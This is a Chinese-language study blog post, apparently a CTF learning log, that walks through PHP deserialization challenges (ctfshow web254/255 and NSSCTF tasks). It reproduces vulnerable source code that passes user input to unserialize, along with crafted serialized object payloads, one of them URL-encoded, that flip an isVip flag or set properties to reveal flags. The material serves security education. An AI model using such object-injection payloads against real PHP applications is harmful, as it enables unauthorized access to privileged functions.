        <content type="html"><![CDATA[<p>啊啊啊啊啊啊啊！！！气死偶类，忘保存了操，重写一遍吧。。。</p><p>这周主要是学习的sql注入以及php反序列化</p><p>选题标明出处</p><p>web254</p><p>（本来还有一些个人吐槽感想的，不想写了）</p><p>看源代码</p><?php<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">/*<br></code></pre></td></tr></table></figure># -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified by:   h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;                <span class="hljs-comment">//定义一个username的变量，值为xxxxxx</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;                <span class="hljs-comment">//定义一个password的变量，值为xxxxxx</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;                      <span class="hljs-comment">//isvip状态为false</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>)&#123;            <span class="hljs-variable language_">$this</span>-&gt;isVip=<span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;                    <span class="hljs-comment">//如果username和password都满足条件，将isvip状态改为true</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;      <span class="hljs-comment">//flag的触发条件是这个函数</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br></code></pre></td></tr></table></figure>$password=$_GET['password'];           //要使用get的方法把这两个参数的值传上去才能继续<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dns">if<span class="hljs-punctuation">(</span>isset<span class="hljs-punctuation">(</span>$username<span class="hljs-punctuation">)</span> &amp;&amp; isset<span class="hljs-punctuation">(</span>$password<span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>&#123;    $user = new ctfShowUser<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-comment">;</span><br>    if<span class="hljs-punctuation">(</span>$user-&gt;login<span class="hljs-punctuation">(</span>$username,$password<span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>&#123;<br>        if<span class="hljs-punctuation">(</span>$user-&gt;checkVip<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>&#123;            $user-&gt;vipOneKeyGetFlag<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-comment">;</span><br>        &#125;<br>    &#125;else&#123;<br>        echo <span class="hljs-string">&quot;no vip,no flag&quot;</span><span class="hljs-comment">;                //给了整体的判断逻辑</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>整体的判断逻辑是这样的，先从new ctfShowUser(); 这里出发，然后进入login函数，进入check后，条件通过进入vipOneKeyGetFlag()这个函数，得到flag其实与构造pop链一样有不一样，php反序列化我感觉更多是对代码的审计和他的逻辑链条，pop链更像他的高级版？这个题目也是那种连环跳跃的感觉payload：xxxxxxxxxxx?username=xxxxxx&password=xxxxxxWeb255 这道题目和254比起来，多了一个cookie校验的环节看源代码 <?php<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">/*<br></code></pre></td></tr></table></figure># -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified by:   h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>整体的判断逻辑是这样的，从cookie校验开始，注意到 unserialize这个函数，说明要把cookie里面改写成user=xxxxxxxx，说明要构造反序列化，然后进入login函数，进入check后，条件通过进入vipOneKeyGetFlag()这个函数，得到flag 什么叫序列化：将对象转为字符串什么是反序列化：将字符串反向为对象因为我们是向cookie中写入字符串，然后再通过unserialize函数反序列化成对象怎么构造反序列化呢 O:11:"ctfShowUser":3:{s:8:"username";s:5:"xxxxxx";s:8:"password";s:6:"xxxxxx";s:5:"isVip";b:1;} O：对象  s:字符串   b：布尔运算   i：整数    a：数组      d：浮点数一般是这个格式：类型（o，s啥的）:长度：内容：;(结束符) o一般还会带上最后的属性个数和{}的属性列表编写好字符串后，url编码，让cookie能读懂，因为cookie不认分号之类的特殊符号<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">user</span>=O%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ctfShowUser%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>username%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxxxxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>password%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxxxxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>isVip%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure>(这里司马老板改密码了，环境我进不去了，但是我觉得我的思路和字符串构造都没有问题) （由于司马老板改密码的原因，我换平台了） [反序列化1]P1 (每天闲的没事都去nss签签到，没想到真让我白嫖了一份教程) 这里就是系统化的学习了看源码<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NSS</span> &#123;<br>    <span class="hljs-keyword">var</span> $name;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">__destruct</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">if</span> ($this-&gt;name === <span class="hljs-string">&#x27;ctf&#x27;</span>) &#123;<br>            echo <span class="hljs-title function_">getenv</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_">unserialize</span>($_GET[<span class="hljs-string">&#x27;n&#x27;</span>]);<br></code></pre></td></tr></table></figure>定义了一个类叫NSS，里面有个属性叫name 函数__destruct()，即当对象被销毁时自动调用当name=ctf时，输出flag，使用get的方法 payload：xxxxxx?n=O:3:"NSS":1:{s:4:"name";s:3:"ctf";} (考虑到老人可能不用这个平台，又不想让老仁花钱，想验证可以找我要号) 什么是类：好比一张图纸，里面定义了属性和方法，比如这道题里面的name就是属性，destruct就是方法，类名就是对类的命名，像这里的NSS[反序列化1]P2 看源代码 <?php<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">highlight_file</span>(__FILE__);<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NSS</span> &#123;<br>    private $name;<br>    protected $url;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">__destruct</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">if</span> ($this-&gt;name === <span class="hljs-string">&#x27;ctf&#x27;</span> &amp;&amp; $this-&gt;url === <span class="hljs-string">&#x27;nss&#x27;</span>) &#123;<br>            echo <span class="hljs-title function_">getenv</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_">unserialize</span>($_GET[<span class="hljs-string">&#x27;n&#x27;</span>]);<br></code></pre></td></tr></table></figure>注意，里面访问修饰符由public变成了一个是private，一个protected 访问修饰符即定义了属性和方法能被什么东西访问 public是公开的，private是只有本类内部可以访问，而protected是本类和子类都可以具体差别如下<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">public</span>     公开的     任何地方（本类、子类、外部）<br><span class="hljs-keyword">protected</span>     受保护的     本类 + 子类<br><span class="hljs-keyword">private</span>     私有的     仅本类<br></code></pre></td></tr></table></figure>在链条上的构建]]></content>
      
      
      
